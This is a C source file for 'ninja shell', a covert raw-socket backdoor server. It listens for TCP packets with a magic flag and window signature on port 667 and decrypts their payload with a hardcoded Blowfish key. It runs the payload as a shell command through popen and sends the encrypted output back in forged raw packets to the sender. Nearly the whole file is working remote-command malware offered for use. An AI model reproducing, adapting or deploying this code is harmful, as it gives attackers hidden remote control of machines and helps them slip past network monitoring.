/*
Author:Antonio Costa aka " Cooler_ "
contact: c00f3r[at]gmail[dot]com

    Copyright (C) 2013 ninja shell authors,
    
    This file is part of ninja shell
    
    ninja shell is free software: you can redistribute it and/or modify
    it under the terms of the GNU Lesser General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    ninja shell is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Lesser General Public License for more details.

    You should have received a copy of the GNU Lesser General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

Thanks: Iak(Tiago Natel),m0nad(Victor Ramos)

What is this ?
just another raw socket shell server,
this version use blowfish on payloads

need openssl lib

to run:
# gcc server_blowfish.c -o server_blowfish -lssl -lcrypto
#./server
 

*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <alloca.h>

// to use blowfish func
#include <openssl/blowfish.h>
#define MASTER "Jiraya!!"     
       
// here you define the port
#define PORT  667
#define MAX    9192
#define ERRO   -1

void fazerpacote(char * dest_addr, unsigned short dest_port,unsigned char *payload); 
unsigned short in_cksum(unsigned short *, int);   

void chomp(char * str);


int main(void)
{
 FILE *fpipe;
 int  sockfd=0,counter=0,cmd=1;
 char buffer[MAX],line[MAX];
 char ip_tmp[INET_ADDRSTRLEN];
 struct iphdr *iphr;
 struct tcphdr *tcphr;

 bzero(buffer,MAX);
// data=buffer+sizeof(struct iphdr)+sizeof(struct tcphdr);
 iphr = (struct iphdr *) buffer;
 tcphr = (struct tcphdr *) (buffer + sizeof(struct iphdr));

// start blowfish key
 BF_KEY *key = calloc(1, sizeof(BF_KEY));
 BF_set_key(key, 8, (const unsigned char*)MASTER);
 unsigned char *decripto_out = calloc(8+1, sizeof(char));
 unsigned char *cripto_out = calloc(8+1, sizeof(char));

 if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == ERRO)
  exit(ERRO);

 while(read(sockfd, buffer, sizeof (buffer)-1)) 
 {
  if((ntohs(tcphr->dest)==PORT)&&(tcphr->fin == 1)&&(tcphr->psh == 1) && (tcphr->urg == 1) && (tcphr->window == htons(10666))) 
  {
   if(!(cmd&1))
   {
    cmd=1; 
    
   } else {
    counter=sizeof(struct tcphdr) + sizeof(struct iphdr);
// tentar armazenar em uma var com strcpy
 //   fprintf(stdout,"\npayload: %s \n",buffer+counter);
 //   fprintf(stdout,"IP source: %u  IP dest: %u\n",iphr->saddr,iphr->daddr);
//convert unsigned int 2 char * ip...
    inet_ntop(AF_INET,&(iphr->saddr),ip_tmp,INET_ADDRSTRLEN);
  //  sprintf(string,"%s",buffer+counter);
    BF_ecb_encrypt((unsigned char *)buffer+counter, decripto_out, key, BF_DECRYPT);

// execute cmd
    if ( !(fpipe = (FILE *)popen ((char *)decripto_out,"r")) ) 
    {
     puts("error on pipe");
     exit(1);
    }
    while (fgets (line, sizeof line, fpipe)) 
    {
     chomp(line);
     BF_ecb_encrypt((unsigned char *)line, cripto_out, key, BF_ENCRYPT);
   //  printf("line:%s\ncript: %s\n",line,cripto_out);
     fazerpacote(ip_tmp,PORT,cripto_out);
 //   fazerpacote(ip_tmp,667,buffer+counter);
     bzero(line,MAX);
    }
    pclose(fpipe);
    cmd++;
   }
//   fazerpacote(ip_tmp,667,"[[[ this is back ]]]");
//   fprintf(stdout,"ping back to %s \n",ip_tmp);
  }
//  memset(buffer, '\0', sizeof(buffer));
  
  bzero(buffer,MAX);
 }

 exit(1);
}



     
void fazerpacote(char *dest_addr, unsigned short dest_port,unsigned char * payload)
{    

 char packet[sizeof (struct iphdr) + sizeof (struct tcphdr) + MAX];
 struct envio {    
  struct iphdr *ip;    
  struct tcphdr *tcp;
 } envio;    

 struct pseudo_header {    
  unsigned int source_address;    
  unsigned int dest_address;    
  unsigned char placeholder;    
  unsigned char protocol;    
  unsigned short tcp_length;    
  char* data;
 };
     
 int tcp_socket;   
 struct sockaddr_in sin; 
 unsigned int destino;
 
 envio.ip = (struct iphdr*) packet;
 envio.tcp = (struct tcphdr*) (packet + sizeof (struct iphdr));
 struct pseudo_header pseudo_header; 
 char* data = packet +  sizeof(struct iphdr) + sizeof(struct tcphdr);
 
 // AQUI A SUA MENSAGEM A SER ENVIADA (PAYLOAD)
 const char* message = (const char *)payload;
 strncpy(data, message, strlen(message));
 
// inet_pton(PF_INET, source_addr, &remetente);
 inet_pton(PF_INET, dest_addr, &destino);
 
 bzero(packet, sizeof(struct iphdr)); 
         
//setamos variaveis do pacote ip   
 envio.ip->ihl = 5;    
 envio.ip->version = 4;    
 envio.ip->tos = 0;    
 envio.ip->tot_len = htons(sizeof(struct iphdr) + MAX);  
 envio.ip->id = dest_port;    
 envio.ip->frag_off = 0;    
 envio.ip->ttl = 255;    
 envio.ip->protocol = IPPROTO_TCP;    
 envio.ip->check = 0;    
// envio.ip->saddr = remetente;    
 envio.ip->daddr = destino;    
        
//setamos variaveis do pacote TCP    
 envio.tcp->source = dest_port;    
 envio.tcp->dest = htons(dest_port);    
 envio.tcp->seq = dest_port;          
 envio.tcp->res1 = 0;
 envio.tcp->res2 = 0;     
 envio.tcp->doff = 5;    
 envio.tcp->ack = 0; 
 envio.tcp->ack_seq = 0;    
 envio.tcp->urg_ptr = 0;        
 envio.tcp->window = htons(10666);    
 envio.tcp->check = 0;   
//flags 
 envio.tcp->fin = 1;    
 envio.tcp->syn = 0;    
 envio.tcp->rst = 0;    
 envio.tcp->psh = 1;  
 envio.tcp->urg = 1;  
 envio.tcp->ack = 0; 
                
 sin.sin_family = AF_INET;    
 sin.sin_port = envio.tcp->source;    
 sin.sin_addr.s_addr = envio.ip->daddr;       
        
// abrimos a socket   
  tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);    
  if(tcp_socket < 0) 
  {    
   perror("socket");    
   exit(1);    
  }    
        
// setamos os campos que precisão ser mudados   
  envio.tcp->source++;    
  envio.ip->id++;    
  envio.tcp->seq++;    
  envio.tcp->check = 0;    
  envio.ip->check = 0;    

    //envio.ip->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);           
// checksum   
  envio.ip->check = in_cksum((unsigned short *)&envio.ip, sizeof (struct iphdr)); 
     
// setamos campo dos cabeçalhos     
  pseudo_header.source_address = envio.ip->saddr;    
  pseudo_header.dest_address = envio.ip->daddr;    
  
  pseudo_header.protocol = IPPROTO_TCP;    
  pseudo_header.tcp_length = htons(sizeof(struct tcphdr) + MAX);
  pseudo_header.data = data;

  envio.tcp->check = in_cksum((unsigned short *)&pseudo_header, sizeof(struct tcphdr) + sizeof(struct pseudo_header) + MAX); //32    

  // Voce precisa setar HDRINCL no seu socket para o kernel aceitar a sua definicao do iphdr
  int one = 1;
  const int *val = &one;
  if (setsockopt (tcp_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    printf ("Warning: Cannot set HDRINCL!\n");

  if (sendto(tcp_socket, packet, ntohs(envio.ip->tot_len), 0, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) < 0) 
  {
    fprintf(stderr, "sendto error...\n");
    perror("ops");
    close(tcp_socket);    
    exit(1);
  } 
    
  close(tcp_socket);    
}    
     
//calculo feito afim de checar a integridade 
unsigned short in_cksum(unsigned short *ptr, int nbytes) 
{    
 register u_short    answer;     // u_short == 16 bits   
 register long       sum;        // long == 32 bits    
 u_short         oddbyte;     
     
 sum = 0;    
 while(nbytes > 1)  
 {    
  sum += *ptr++;   
  nbytes -= 2;    
 }    
                        
 if(!(nbytes^1)) 
 {    
  oddbyte = 0;       
  *((u_char *) &oddbyte) = *(u_char *)ptr;      
  sum += oddbyte;    
 }    
     
 sum = (sum >> 16) + (sum & 0xffff);  // addicina auto-16 para baixo-16     
 sum += (sum >> 16);           
 answer = ~sum;         
 return(answer);    
}    


void chomp(char * str)
{
  while(*str) 
  {
    if(*str == '\n' || *str == '\r') 
    {
     *str = 0;
     return;
    }
    str++;
  }
} 
